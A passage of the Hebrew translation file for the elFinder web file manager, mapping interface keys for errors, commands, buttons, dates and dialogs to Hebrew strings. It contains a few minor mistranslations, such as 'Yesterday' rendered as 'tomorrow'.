/**
 * עברית translation
 * @author Yaron Shahrabani <sh.yaron@gmail.com>
 * @version 2022-03-01
 */
 (function(root, factory) {
	if (typeof define === 'function' && define.amd) {
		define(['elfinder'], factory);
	} else if (typeof exports !== 'undefined') {
		module.exports = factory(require('elfinder'));
	} else {
		factory(root.elFinder);
	}
}(this, function(elFinder) {
	elFinder.prototype.i18.he = {
		translator : 'Yaron Shahrabani &lt;sh.yaron@gmail.com&gt;',
		language   : 'עברית',
		direction  : 'rtl',
		dateFormat : 'd.m.Y H:i', // will show like: 01.03.2022 16:25
		fancyDateFormat : '$1 H:i', // will show like: היום 16:25
		nonameDateFormat : 'ymd-His', // noname upload will show like: 220301-162510
		messages   : {
			'getShareText' : 'שתפו',
			'Editor ': 'עורך קוד',
			/********************************** errors **********************************/
			'error'                : 'שגיאה',
			'errUnknown'           : 'שגיאה בלתי מוכרת.',
			'errUnknownCmd'        : 'פקודה בלתי מוכרת.',
			'errJqui'              : 'תצורת ה־jQuery UI שגויה. יש לכלול רכיבים הניתנים לבחירה, גרירה והשלכה.',
			'errNode'              : 'elFinder דורש יצירה של רכיב DOM.',
			'errURL'               : 'התצורה של elFinder שגויה! אפשרות הכתובת (URL) לא הוגדרה.',
			'errAccess'            : 'הגישה נדחית.',
			'errConnect'           : 'לא ניתן להתחבר למנגנון.',
			'errAbort'             : 'החיבור בוטל.',
			'errTimeout'           : 'זמן החיבור פג.',
			'errNotFound'          : 'לא נמצא מנגנון.',
			'errResponse'          : 'תגובת המנגנון שגויה.',
			'errConf'              : 'תצורת המנגנון שגויה.',
			'errJSON'              : 'המודול PHP JSON לא מותקן.',
			'errNoVolumes'         : 'אין כוננים זמינים לקריאה.',
			'errCmdParams'         : 'פרמטרים שגויים לפקודה „$1“.',
			'errDataNotJSON'       : 'הנתונים אינם JSON.',
			'errDataEmpty'         : 'הנתונים ריקים.',
			'errCmdReq'            : 'בקשה למנגנון דורשת שם פקודה.',
			'errOpen'              : 'לא ניתן לפתוח את „$1“.',
			'errNotFolder'         : 'הפריט אינו תיקייה.',
			'errNotFile'           : 'הפריט אינו קובץ.',
			'errRead'              : 'לא ניתן לקרוא את „$1“.',
			'errWrite'             : 'לא ניתן לכתוב אל „$1“.',
			'errPerm'              : 'ההרשאה נדחתה.',
			'errLocked'            : '„$1“ נעול ואין אפשרות לשנות את שמו, להעבירו או להסירו.',
			'errExists'            : 'קובץ בשם „$1“ כבר קיים.',
			'errInvName'           : 'שם הקובץ שגוי.',
			'errInvDirname'        : 'שם תיקייה לא חוקי.',  // from v2.1.24 added 12.4.2017
			'errFolderNotFound'    : 'התיקייה לא נמצאה.',
			'errFileNotFound'      : 'הקובץ לא נמצא.',
			'errTrgFolderNotFound' : 'תיקיית היעד „$1“ לא נמצאה.',
			'errPopup'             : 'הדפדפן מנע פתיחת חלון קובץ. כדי לפתוח קובץ יש לאפשר זאת בהגדרות הדפדפן.',
			'errMkdir'             : 'לא ניתן ליצור את התיקייה „$1“.',
			'errMkfile'            : 'לא ניתן ליצור את הקובץ „$1“.',
			'errRename'            : 'לא ניתן לשנות את השם של „$1“.',
			'errCopyFrom'          : 'העתקת קבצים מהכונן „$1“ אינה מאופשרת.',
			'errCopyTo'            : 'העתקת קבצים אל הכונן „$1“ אינה מאופשרת.',
			'errMkOutLink'         : 'לא ניתן ליצור קישור אל מחוץ לשורש הנפח.', // from v2.1 added 03.10.2015
			'errUpload'            : 'שגיאת העלאה.',  // old name - errUploadCommon
			'errUploadFile'        : 'לא ניתן להעלות את „$1“.', // old name - errUpload
			'errUploadNoFiles'     : 'לא נמצאו קבצים להעלאה.',
			'errUploadTotalSize'   : 'הנתונים חורגים מהגודל המרבי המותר.', // old name - errMaxSize
			'errUploadFileSize'    : 'הקובץ חורג מהגודל המרבי המותר.', //  old name - errFileMaxSize
			'errUploadMime'        : 'סוג הקובץ אינו מורשה.',
			'errUploadTransfer'    : 'שגיאת העברה „$1“.',
			'errUploadTemp'        : 'לא ניתן ליצור קובץ זמני להעלאה.', // from v2.1 added 26.09.2015
			'errNotReplace'        : 'הפריט „$1“ כבר קיים במיקום זה ואי אפשר להחליפו בפריט מסוג אחר.', // new
			'errReplace'           : 'לא ניתן להחליף את „$1“.',
			'errSave'              : 'לא ניתן לשמור את „$1“.',
			'errCopy'              : 'לא ניתן להעתיק את „$1“.',
			'errMove'              : 'לא ניתן להעביר את „$1“.',
			'errCopyInItself'      : 'לא ניתן להעתיק את „$1“ לתוך עצמו.',
			'errRm'                : 'לא ניתן להסיר את „$1“.',
			'errTrash'             : 'לא ניתן לאשפה.', // from v2.1.24 added 30.4.2017
			'errRmSrc'             : 'לא ניתן להסיר את קובצי המקור.',
			'errExtract'           : 'לא ניתן לחלץ קבצים מהארכיון „$1“.',
			'errArchive'           : 'לא ניתן ליצור ארכיון.',
			'errArcType'           : 'סוג הארכיון אינו נתמך.',
			'errNoArchive'         : 'הקובץ אינו ארכיון או שסוג הקובץ שלו אינו נתמך.',
			'errCmdNoSupport'      : 'המנגנון אינו תומך בפקודה זו.',
			'errReplByChild'       : 'לא ניתן להחליף את התיקייה „$1“ בפריט מתוכה.',
			'errArcSymlinks'       : 'מטעמי אבטחה לא ניתן לחלץ ארכיונים שמכילים קישורים סימבוליים או קבצים עם שמות בלתי מורשים.', // edited 24.06.2012
			'errArcMaxSize'        : 'הארכיון חורג מהגודל המרבי המותר.',
			'errResize'            : 'לא ניתן לשנות את הגודל של „$1“.',
			'errResizeDegree'      : 'מעלות ההיפוך שגויות.',  // added 7.3.2013
			'errResizeRotate'      : 'לא ניתן להפוך את התמונה.',  // added 7.3.2013
			'errResizeSize'        : 'גודל התמונה שגוי.',  // added 7.3.2013
			'errResizeNoChange'    : 'גודל התמונה לא השתנה.',  // added 7.3.2013
			'errUsupportType'      : 'סוג הקובץ אינו נתמך.',
			'errNotUTF8Content'    : 'הקובץ „$1“ הוא לא בתסדיר UTF-8 ולא ניתן לערוך אותו.',  // added 9.11.2011
			'errNetMount'          : 'לא ניתן לעגן את „$1“.', // added 17.04.2012
			'errNetMountNoDriver'  : 'פרוטוקול בלתי נתמך.',     // added 17.04.2012
			'errNetMountFailed'    : 'העיגון נכשל.',         // added 17.04.2012
			'errNetMountHostReq'   : 'נדרש מארח.', // added 18.04.2012
			'errSessionExpires'    : 'ההפעלה שלך פגה עקב חוסר פעילות.',
			'errCreatingTempDir'   : 'לא ניתן ליצור תיקייה זמנית: „$1“',
			'errFtpDownloadFile'   : 'לא ניתן להוריד קובץ מ־ FTP: „$1“',
			'errFtpUploadFile'     : 'לא ניתן להעלות קובץ ל־FTP: „$1“',
			'errFtpMkdir'          : 'לא ניתן ליצור תיקייה מרוחקת ב־FTP: „$1“',
			'errArchiveExec'       : 'שמירת הקבצים בארכיון נכשלה: „$1“',
			'errExtractExec'       : 'חילוץ קבצים נכשל: „$1“',
			'errNetUnMount'        : 'Unable to unmount.', // from v2.1 added 30.04.2012
			'errConvUTF8'          : 'לא ניתן להמרה ל-UTF-8', // from v2.1 added 08.04.2014
			'errFolderUpload'      : 'נסה את הדפדפן המודרני, אם תרצה להעלות את התיקיה.', // from v2.1 added 26.6.2015
			'errSearchTimeout'     : 'תם הזמן הקצוב בזמן חיפוש "$1". תוצאת החיפוש היא חלקית.', // from v2.1 added 12.1.2016
			'errReauthRequire'     : 'נדרש אישור מחדש.', // from v2.1.10 added 24.3.2016
			'errMaxTargets'        : 'המספר המרבי של פריטים לבחירה הוא $1.', // from v2.1.17 added 17.10.2016
			'errRestore'           : 'לא ניתן לשחזר מהאשפה. לא ניתן לזהות את יעד השחזור.', // from v2.1.24 added 3.5.2017
			'errEditorNotFound'    : 'עורך לא נמצא לסוג קובץ זה.', // from v2.1.25 added 23.5.2017
			'errServerError'       : 'אירעה שגיאה בצד השרת.', // from v2.1.25 added 16.6.2017
			'errEmpty'             : 'לא ניתן לרוקן את התיקייה "$1".', // from v2.1.25 added 22.6.2017
			'moreErrors'           : 'יש $1 שגיאות נוספות.', // from v2.1.44 added 9.12.2018
			'errMaxMkdirs'         : 'אתה יכול ליצור עד $1 תיקיות בבת אחת.', // from v2.1.58 added 20.6.2021

			/******************************* commands names ********************************/
			'cmdarchive'   : 'יצירת ארכיון',
			'cmdback'      : 'חזרה',
			'cmdcopy'      : 'העתקה',
			'cmdcut'       : 'גזירה',
			'cmddownload'  : 'הורדה',
			'cmdduplicate' : 'שכפול',
			'cmdedit'      : 'עריכת קובץ',
			'cmdextract'   : 'חילוץ קבצים מארכיון',
			'cmdforward'   : 'העברה',
			'cmdgetfile'   : 'בחירת קבצים',
			'cmdhelp'      : 'פרטים על התכנית הזו',
			'cmdhome'      : 'בית',
			'cmdinfo'      : 'קבלת מידע',
			'cmdmkdir'     : 'תיקייה חדשה',
			'cmdmkdirin'   : 'לתוך תיקייה חדשה', // from v2.1.7 added 19.2.2016
			'cmdmkfile'    : 'קובץ חדש',
			'cmdopen'      : 'פתיחה',
			'cmdpaste'     : 'הדבקה',
			'cmdquicklook' : 'תצוגה מקדימה',
			'cmdreload'    : 'רענון',
			'cmdrename'    : 'שינוי שם',
			'cmdrm'        : 'מחיקה',
			'cmdtrash'     : 'לפח', //from v2.1.24 added 29.4.2017
			'cmdrestore'   : 'לשחזר', //from v2.1.24 added 3.5.2017
			'cmdsearch'    : 'חיפוש קבצים',
			'cmdup'        : 'מעבר לתיקיית ההורה',
			'cmdupload'    : 'העלאת קבצים',
			'cmdview'      : 'תצוגה',
			'cmdresize'    : 'שינוי גודל והיפוך',
			'cmdsort'      : 'מיון',
			'cmdnetmount'  : 'עיגון כונן רשת', // added 18.04.2012
			'cmdnetunmount': 'Unmount', // from v2.1 added 30.04.2012
			'cmdplaces'    : 'למקומות', // added 28.12.2014
			'cmdchmod'     : 'שנה מצב', // from v2.1 added 20.6.2015
			'cmdopendir'   : 'פתח תיקיה', // from v2.1 added 13.1.2016
			'cmdcolwidth'  : 'אפס את רוחב העמודה', // from v2.1.13 added 12.06.2016
			'cmdfullscreen': 'מסך מלא', // from v2.1.15 added 03.08.2016
			'cmdmove'      : 'לָזוּז', // from v2.1.15 added 21.08.2016
			'cmdempty'     : 'רוקן את התיקיה', // from v2.1.25 added 22.06.2017
			'cmdundo'      : 'לבטל', // from v2.1.27 added 31.07.2017
			'cmdredo'      : 'לַעֲשׂוֹת שׁוּב', // from v2.1.27 added 31.07.2017
			'cmdpreference': 'העדפות', // from v2.1.27 added 03.08.2017
			'cmdselectall' : 'בחר הכל', // from v2.1.28 added 15.08.2017
			'cmdselectnone': 'בחר אף אחד', // from v2.1.28 added 15.08.2017
			'cmdselectinvert': 'בחירה הפוך', // from v2.1.28 added 15.08.2017
			'cmdopennew'   : 'פתח בחלון חדש', // from v2.1.38 added 3.4.2018
			'cmdhide'      : 'הסתר (העדפה)', // from v2.1.41 added 24.7.2018

			/*********************************** buttons ***********************************/
			'btnClose'  : 'סגירה',
			'btnSave'   : 'שמירה',
			'btnRm'     : 'הסרה',
			'btnApply'  : 'החלה',
			'btnCancel' : 'ביטול',
			'btnNo'     : 'לא',
			'btnYes'    : 'כן',
			'btnMount'  : 'עיגון',  // added 18.04.2012
			'btnApprove': 'עבור אל $1 ואשר', // from v2.1 added 26.04.2012
			'btnUnmount': 'Unmount', // from v2.1 added 30.04.2012
			'btnConv'   : 'להמיר', // from v2.1 added 08.04.2014
			'btnCwd'    : 'כאן',      // from v2.1 added 22.5.2015
			'btnVolume' : 'כרך',    // from v2.1 added 22.5.2015
			'btnAll'    : 'את כל',       // from v2.1 added 22.5.2015
			'btnMime'   : 'סוג MIME', // from v2.1 added 22.5.2015
			'btnFileName':'שם קובץ',  // from v2.1 added 22.5.2015
			'btnSaveClose': 'שמור וסגור', // from v2.1 added 12.6.2015
			'btnBackup' : 'גיבוי', // fromv2.1 added 28.11.2015
			'btnRename'    : 'שנה שם',      // from v2.1.24 added 6.4.2017
			'btnRenameAll' : 'שנה שם (הכל)', // from v2.1.24 added 6.4.2017
			'btnPrevious' : 'הקודם ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnNext'     : 'הבא ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnSaveAs'   : 'שמור בשם', // from v2.1.25 added 24.5.2017

			/******************************** notifications ********************************/
			'ntfopen'     : 'פתיחת תיקייה',
			'ntffile'     : 'פתיחת קובץ',
			'ntfreload'   : 'רענון תוכן התיקייה',
			'ntfmkdir'    : 'תיקייה נוצרת',
			'ntfmkfile'   : 'קבצים נוצרים',
			'ntfrm'       : 'קבצים נמחקים',
			'ntfcopy'     : 'קבצים מועתקים',
			'ntfmove'     : 'קבצים מועברים',
			'ntfprepare'  : 'העתקת קבצים בהכנה',
			'ntfrename'   : 'שמות קבצים משתנים',
			'ntfupload'   : 'קבצים נשלחים',
			'ntfdownload' : 'קבצים מתקבלים',
			'ntfsave'     : 'שמירת קבצים',
			'ntfarchive'  : 'ארכיון נוצר',
			'ntfextract'  : 'מחולצים קבצים מארכיון',
			'ntfsearch'   : 'קבצים בחיפוש',
			'ntfresize'   : 'גודל קבצים משתנה',
			'ntfsmth'     : 'מתבצעת פעולה',
			'ntfloadimg'  : 'נטענת תמונה',
			'ntfnetmount' : 'כונן רשת מעוגן', // added 18.04.2012
			'ntfnetunmount': 'Unmounting network volume', // from v2.1 added 30.04.2012
			'ntfdim'      : 'ממדי תמונה מתקבלים', // added 20.05.2013
			'ntfreaddir'  : 'קריאת מידע על תיקיות', // from v2.1 added 01.07.2013
			'ntfurl'      : 'מקבל את כתובת האתר של הקישור', // from v2.1 added 11.03.2014
			'ntfchmod'    : 'שינוי מצב קובץ', // from v2.1 added 20.6.2015
			'ntfpreupload': 'מאמת את שם הקובץ להעלאה', // from v2.1 added 31.11.2015
			'ntfzipdl'    : 'יצירת קובץ להורדה', // from v2.1.7 added 23.1.2016
			'ntfparents'  : 'קבלת מידע על נתיב', // from v2.1.17 added 2.11.2016
			'ntfchunkmerge': 'מעבד את הקובץ שהועלה', // from v2.1.17 added 2.11.2016
			'ntftrash'    : 'עושה לזרוק לפח', // from v2.1.24 added 2.5.2017
			'ntfrestore'  : 'עושה שחזור מהאשפה', // from v2.1.24 added 3.5.2017
			'ntfchkdir'   : 'בודק תיקיית יעד', // from v2.1.24 added 3.5.2017
			'ntfundo'     : 'מבטל פעולה קודמת', // from v2.1.27 added 31.07.2017
			'ntfredo'     : 'ביצוע מחדש של ביטול קודמים', // from v2.1.27 added 31.07.2017
			'ntfchkcontent' : 'בדיקת תכולה', // from v2.1.41 added 3.8.2018

			/*********************************** volumes *********************************/
			'volume_Trash' : 'פַּח אַשׁפָּה', //from v2.1.24 added 29.4.2017

			/************************************ dates **********************************/
			'dateUnknown' : 'לא ידוע',
			'Today'       : 'היום',
			'Yesterday'   : 'מחר',
			'msJan'       : 'ינו׳',
			'msFeb'       : 'פבר׳',
			'msMar'       : 'מרץ',
			'msApr'       : 'אפר׳',
			'msMay'       : 'מאי',
			'msJun'       : 'יונ׳',
			'msJul'       : 'יול׳',
			'msAug'       : 'אוג׳',
			'msSep'       : 'ספט׳',
			'msOct'       : 'אוק׳',
			'msNov'       : 'נוב׳',
			'msDec'       : 'דצמ׳',
			'January'     : 'ינואר',
			'February'    : 'פברואר',
			'March'       : 'מרץ',
			'April'       : 'אפריל',
			'May'         : 'מאי',
			'June'        : 'יוני',
			'July'        : 'יולי',
			'August'      : 'אוגוסט',
			'September'   : 'ספטמבר',
			'October'     : 'אוקטובר',
			'November'    : 'נובמבר',
			'December'    : 'דצמבר',
			'Sunday'      : 'יום ראשון',
			'Monday'      : 'יום שני',
			'Tuesday'     : 'יום שלישי',
			'Wednesday'   : 'יום רביעי',
			'Thursday'    : 'יום חמישי',
			'Friday'      : 'יום שישי',
			'Saturday'    : 'שבת',
			'Sun'         : 'א׳',
			'Mon'         : 'ב׳',
			'Tue'         : 'ג׳',
			'Wed'         : 'ד׳',
			'Thu'         : 'ה',
			'Fri'         : 'ו׳',
			'Sat'         : 'ש׳',

			/******************************** sort variants ********************************/
			'sortname'          : 'לפי שם',
			'sortkind'          : 'לפי סוג',
			'sortsize'          : 'לפי גודל',
			'sortdate'          : 'לפי תאריך',
			'sortFoldersFirst'  : 'תיקיות תחילה',
			'sortperm'          : 'על פי רשות', // from v2.1.13 added 13.06.2016
			'sortmode'          : 'לפי מצב',       // from v2.1.13 added 13.06.2016
			'sortowner'         : 'by ownerלפי הבעלים',      // from v2.1.13 added 13.06.2016
			'sortgroup'         : 'לפי קבוצה',      // from v2.1.13 added 13.06.2016
			'sortAlsoTreeview'  : 'גם Treeview',  // from v2.1.15 added 01.08.2016

			/********************************** new items **********************************/
			'untitled file.txt' : 'NewFile.txt', // added 10.11.2015
			'untitled folder'   : 'תיקייה חדשה',   // added 10.11.2015
			'Archive'           : 'ארכיון חדש',  // from v2.1 added 10.11.2015
			'untitled file'     : 'קובץ חדש.$1',  // from v2.1.41 added 6.8.2018
			'extentionfile'     : '$1: קובץ',    // from v2.1.41 added 6.8.2018
			'extentiontype'     : '$1: $2',      // from v2.1.43 added 17.10.2018

			/********************************** messages **********************************/
			'confirmReq'      : 'נדרש אישור',
			'confirmRm'       : 'להסיר את הקבצים?<br/>פעולה זו בלתי הפיכה!',
			'confirmRepl'     : 'להחליף קובץ ישן בקובץ חדש?',
			'confirmRest'     : 'להחליף את הפריט הקיים בפריט שנמצא באשפה?', // fromv2.1.24 added 5.5.2017
			'confirmConvUTF8' : 'לא ב-UTF-8<br/>המר ל-UTF-8?<br/>התוכן הופך ל-UTF-8 על ידי שמירה לאחר המרה.', // from v2.1 added 08.04.2014
			'confirmNonUTF8'  : 'לא ניתן לזהות את קידוד התווים של הקובץ הזה. זה צריך להמיר זמנית ל-UTF-8 לצורך עריכה.<br/>אנא בחר קידוד תווים של קובץ זה.', // from v2.1.19 added 28.11.2016
			'confirmNotSave'  : 'הוא השתנה.<br/>מאבד עבודה אם לא תשמור שינויים.', // from v2.1 added 15.7.2015
			'confirmTrash'    : 'האם אתה בטוח שברצונך להעביר פריטים לפח האשפה?', //from v2.1.24 added 29.4.2017
			'confirmMove'     : 'האם אתה בטוח שברצונך להעביר פריטים ל-"$1"?', //from v2.1.50 added 27.7.2019
			'apllyAll'        : 'להחיל על הכול',
			'name'            : 'שם',
			'size'            : 'גודל',
			'perms'           : 'הרשאות',
			'modify'          : 'שינוי',
			'kind'            : 'סוג',
			'read'            : 'קריאה',
			'write'           : 'כתיבה',
			'noaccess'        : 'אין גישה',
			'and'             : 'וגם',
			'unknown'         : 'לא ידוע',
			'selectall'       : 'בחירת כל הקבצים',
			'selectfiles'     : 'בחירת קובץ אחד ומעלה',
			'selectffile'     : 'בחירת הקובץ הראשון',
			'selectlfile'     : 'בחירת הקובץ האחרון',
			'viewlist'        : 'תצוגת רשימה',
			'viewicons'       : 'תצוגת סמלים',
			'viewSmall'       : 'אייקונים קטנים', // from v2.1.39 added 22.5.2018
			'viewMedium'      : 'אייקונים בינוניים', // from v2.1.39 added 22.5.2018
			'viewLarge'       : 'אייקונים גדולים', // from v2.1.39 added 22.5.2018
			'viewExtraLarge'  : 'סמלים גדולים במיוחד', // from v2.1.39 added 22.5.2018
			'places'          : 'מיקומים',
			'calc'            : 'חישוב',
			'path'            : 'נתיב',
			'aliasfor'        : 'כינוי עבור',
			'locked'          : 'נעול',
			'dim'             : 'ממדים',
			'files'           : 'קבצים',
			'folders'         : 'תיקיות',
			'items'           : 'פריטים',
			'yes'             : 'כן',
			'no'              : 'לא',
			'link'            : 'קישור',
			'searcresult'     : 'תוצאות חיפוש',
			'selected'        : 'קבצים נבחרים',
			'about'           : 'על אודות',
			'shortcuts'       : 'קיצורי דרך',
			'help'            : 'עזרה',
			'webfm'           : 'מנהל קבצים בדפדפן',
			'ver'             : 'גרסה',
			'protocolver'     : 'גרסת פרוטוקול',
			'homepage'        : 'דף הבית של המיזם',
			'docs'            : 'תיעוד',
			'github'          : 'פילוג עותק ב־Github',
			'twitter'         : 'לעקוב אחרינו בטוויטר',
			'facebook'        : 'להצטרף אלינו בפייסבוק',
			'team'            : 'צוות',
			'chiefdev'        : 'מפתח ראשי',
			'developer'       : 'מתכנת',
			'contributor'     : 'תורם',
			'maintainer'      : 'מתחזק',
			'translator'      : 'מתרגם',
			'icons'           : 'סמלים',
			'dontforget'      : 'לא לשכוח לקחת את המגבת שלך',
			'shortcutsof'     : 'קיצורי הדרך מנוטרלים',
			'dropFiles'       : 'ניתן להשליך את הקבצים לכאן',
			'or'              : 'או',
			'selectForUpload' : 'לבחור קבצים להעלאה',
			'moveFiles'       : 'העברת קבצים',
			'copyFiles'       : 'העתקת קבצים',
			'restoreFiles'    : 'שחזור פריטים', // from v2.1.24 added 5.5.2017
			'rmFromPlaces'    : 'הסרה ממיקומים',
			'aspectRatio'     : 'יחס תצוגה',
			'scale'           : 'מתיחה',
			'width'           : 'רוחב',
			'height'          : 'גובה',
			'resize'          : 'שינוי הגודל',
			'crop'            : 'חיתוך',
			'rotate'          : 'היפוך',
			'rotate-cw'       : 'היפוך ב־90 מעלות נגד השעון',
			'rotate-ccw'      : 'היפוך ב־90 מעלות עם השעון CCW',
			'degree'          : '°',
			'netMountDialogTitle' : 'עיגון כונן רשת', // added 18.04.2012
			'protocol'            : 'פרוטוקול', // added 18.04.2012
			'host'                : 'מארח', // added 18.04.2012
			'port'                : 'פתחה', // added 18.04.2012
			'user'                : 'משתמש', // added 18.04.2012
			'pass'                : 'ססמה', // added 18.04.2012
			'confirmUnmount'      : 'האם אתה מבטל $1?',  // from v2.1 added 30.04.2012
			'dropFilesBrowser': 'שחרר או הדבק קבצים מהדפדפן', // from v2.1 added 30.05.2012
			'dropPasteFiles'  : 'שחרר קבצים, הדבק כתובות URL או תמונות (לוח) כאן', // from v2.1 added 07.04.2014
			'encoding'        : 'הקידוד', // from v2.1 added 19.12.2014
			'locale'          : 'שפה',   // from v2.1 added 19.12.2014
			'searchTarget'    : 'יעד: $1',                // from v2.1 added 22.5.2015
			'searchMime'      : 'חפש לפי סוג MIME קלט', // from v2.1 added 22.5.2015
			'owner'           : 'בעלים', // from v2.1 added 20.6.2015
			'group'           : 'קְבוּצָה', // from v2.1 added 20.6.2015
			'other'           : 'אַחֵר', // from v2.1 added 20.6.2015
			'execute'         : 'לבצע', // from v2.1 added 20.6.2015
			'perm'            : 'רְשׁוּת', // from v2.1 added 20.6.2015
			'mode'            : 'Mode', // from v2.1 added 20.6.2015
			'emptyFolder'     : 'התיקייה ריקה', // from v2.1.6 added 30.12.2015
			'emptyFolderDrop' : 'התיקיה ריקה\\השחרר כדי להוסיף פריטים', // from v2.1.6 added 30.12.2015
			'emptyFolderLTap' : 'התיקיה ריקה\\הקשה ארוכה כדי להוסיף פריטים', // from v2.1.6 added 30.12.2015
			'quality'         : 'איכות', // from v2.1.6 added 5.1.2016
			'autoSync'        : 'סנכרון אוטומטי',  // from v2.1.6 added 10.1.2016
			'moveUp'          : 'לזוז למעלה',  // from v2.1.6 added 18.1.2016
			'getLink'         : 'קבל קישור כתובת URL', // from v2.1.7 added 9.2.2016
			'selectedItems'   : 'פריטים נבחרים ($1)', // from v2.1.7 added 2.19.2016
			'folderId'        : 'מזהה תיקייה', // from v2.1.10 added 3.25.2016
			'offlineAccess'   : 'אפשר גישה לא מקוונת', // from v2.1.10 added 3.25.2016
			'reAuth'          : 'לאימות מחדש', // from v2.1.10 added 3.25.2016
			'nowLoading'      : 'כעת טוען...', // from v2.1.12 added 4.26.2016
			'openMulti'       : 'פתח מספר קבצים', // from v2.1.12 added 5.14.2016
			'openMultiConfirm': 'אתה מנסה לפתוח את קבצי $1. האם אתה בטוח שברצונך לפתוח בדפדפן?', // from v2.1.12 added 5.14.2016
			'emptySearch'     : 'תוצאות החיפוש ריקות ביעד החיפוש.', // from v2.1.12 added 5.16.2016
			'editingFile'     : 'זה עריכת קובץ.', // from v2.1.13 added 6.3.2016
			'hasSelected'     : 'בחרת $1 פריטים.', // from v2.1.13 added 6.3.2016
			'hasClipboard'    : 'יש לך $1 פריטים בלוח.', // from v2.1.13 added 6.3.2016
			'incSearchOnly'   : 'חיפוש מצטבר הוא רק מהתצוגה הנוכחית.', // from v2.1.13 added 6.30.2016
			'reinstate'       : 'חזרה לשגרה', // from v2.1.15 added 3.8.2016
			'complete'        : '$1 הושלם', // from v2.1.15 added 21.8.2016
			'contextmenu'     : 'תפריט הקשר', // from v2.1.15 added 9.9.2016
			'pageTurning'     : 'הפיכת עמודים', // from v2.1.15 added 10.9.2016
			'volumeRoots'     : 'שורשי נפח', // from v2.1.16 added 16.9.2016
			'reset'           : 'איפוס', // from v2.1.16 added 1.10.2016
			'bgcolor'         : 'צבע רקע', // from v2.1.16 added 1.10.2016
			'colorPicker'     : 'בוחר צבעים', // from v2.1.16 added 1.10.2016
			'8pxgrid'         : '8 פיקסלים רשת', // from v2.1.16 added 4.10.2016
			'enabled'         : 'מופעל', // from v2.1.16 added 4.10.2016
			'disabled'        : 'מושבת', // from v2.1.16 added 4.10.2016
			'emptyIncSearch'  : 'תוצאות החיפוש ריקות בתצוגה הנוכחית.\\Aלחץ על [Enter] כדי להרחיב את יעד החיפוש.', // from v2.1.16 added 5.10.2016
			'emptyLetSearch'  : 'תוצאות החיפוש של האות הראשונה ריקות בתצוגה הנוכחית.', // from v2.1.23 added 24.3.2017
			'textLabel'       : 'תווית טקסט', // from v2.1.17 added 13.10.2016
			'minsLeft'        : 'נותרה 1 דקות', // from v2.1.17 added 13.11.2016
			'openAsEncoding'  : 'פתח מחדש עם הקידוד שנבחר', // from v2.1.19 added 2.12.2016
			'saveAsEncoding'  : 'שמור עם הקידוד שנבחר', // from v2.1.19 added 2.12.2016
			'selectFolder'    : 'בחר תיקייה', // from v2.1.20 added 13.12.2016
			'firstLetterSearch': 'חיפוש באות ראשונה', // from v2.1.23 added 24.3.2017
			'presets'         : 'הגדרות קבועות מראש', // from v2.1.25 added 26.5.2017
			'tooManyToTrash'  : 'זה יותר מדי פריטים כך שהוא לא יכול לאשפה.', // from v2.1.25 added 9.6.2017
			'TextArea'        : 'TextArea', // from v2.1.25 added 14.6.2017
			'folderToEmpty'   : 'רוקן את התיקיה "$1".', // from v2.1.25 added 22.6.2017
			'filderIsEmpty'   : 'אין פריטים בתיקייה "$1".', // from v2.1.25 added 22.6.2017
			'preference'      : 'הַעֲדָפָה', // from v2.1.26 added 28.6.2017
			'language'        : 'שפה', // from v2.1.26 added 28.6.2017
			'clearBrowserData': 'אתחל את ההגדרות שנשמרו בדפדפן זה', // from v2.1.26 added 28.6.2017
			'toolbarPref'     : 'הגדרות סרגל הכלים', // from v2.1.27 added 2.8.2017
			'charsLeft'       : '... נותרו $1 תווים.',  // from v2.1.29 added 30.8.2017
			'linesLeft'       : '... נותרו שורות 1$.',  // from v2.1.52 added 16.1.2020
			'sum'             : 'סְכוּם', // from v2.1.29 added 28.9.2017
			'roughFileSize'   : 'גודל קובץ מחוספס', // from v2.1.30 added 2.11.2017
			'autoFocusDialog' : 'התמקד באלמנט של דיאלוג עם העברה בעכבר',  // from v2.1.30 added 2.11.2017
			'select'          : 'בחר', // from v2.1.30 added 23.11.2017
			'selectAction'    : 'פעולה בעת בחירת קובץ', // from v2.1.30 added 23.11.2017
			'useStoredEditor' : 'פתח עם העורך שבו השתמשת בפעם הקודמת', // from v2.1.30 added 23.11.2017
			'selectinvert'    : 'בחירה הפוך', // from v2.1.30 added 25.11.2017
			'renameMultiple'  : 'האם אתה בטוח שברצונך לשנות את השם של $1 פריטים נבחרים כמו $2?<br/>לא ניתן לבטל זאת!', // from v2.1.31 added 4.12.2017
			'batchRename'     : 'שינוי שם אצווה', // from v2.1.31 added 8.12.2017
			'plusNumber'      : '+ מספר', // from v2.1.31 added 8.12.2017
			'asPrefix'        : 'הוסף קידומת', // from v2.1.31 added 8.12.2017
			'asSuffix'        : 'הוסיפו סיומת', // from v2.1.31 added 8.12.2017
			'changeExtention' : 'שנה סיומת', // from v2.1.31 added 8.12.2017
			'columnPref'      : 'הגדרות עמודות (תצוגת רשימה)', // from v2.1.32 added 6.2.2018
			'reflectOnImmediate' : 'כל השינויים ישתקפו מיד לארכיון.', // from v2.1.33 added 2.3.2018
			'reflectOnUnmount'   : 'כל השינויים לא ישתקפו עד לביטול הטעינה של אמצעי אחסון זה.', // from v2.1.33 added 2.3.2018
			'unmountChildren' : 'הכרך/ים הבאים שהותקנו על הכרך הזה בוטלו גם הם. האם אתה בטוח שתבטל אותו?', // from v2.1.33 added 5.3.2018
			'selectionInfo'   : 'מידע בחירה', // from v2.1.33 added 7.3.2018
			'hashChecker'     : 'אלגוריתמים להצגת ה-hash של הקובץ', // from v2.1.33 added 10.3.2018
			'infoItems'       : 'פריטי מידע (חלונית פרטי בחירה)', // from v2.1.38 added 28.3.2018
			'pressAgainToExit': 'לחץ שוב כדי לצאת.', // from v2.1.38 added 1.4.2018
			'toolbar'         : 'סרגל כלים', // from v2.1.38 added 4.4.2018
			'workspace'       : 'חלל עבודה', // from v2.1.38 added 4.4.2018
			'dialog'          : 'דיאלוג', // from v2.1.38 added 4.4.2018
			'all'             : 'את כל', // from v2.1.38 added 4.4.2018
			'iconSize'        : 'גודל סמל (תצוגת סמלים)', // from v2.1.39 added 7.5.2018
			'editorMaximized' : 'פתח את חלון העורך המקסימלי', // from v2.1.40 added 30.6.2018
			'editorConvNoApi' : 'מכיוון שהמרה באמצעות API אינה זמינה כעת, אנא המרה באתר.', //from v2.1.40 added 8.7.2018
			'editorConvNeedUpload' : 'לאחר ההמרה, עליך להעלות עם כתובת האתר של הפריט או קובץ שהורדת כדי לשמור את הקובץ שהומר.', //from v2.1.40 added 8.7.2018
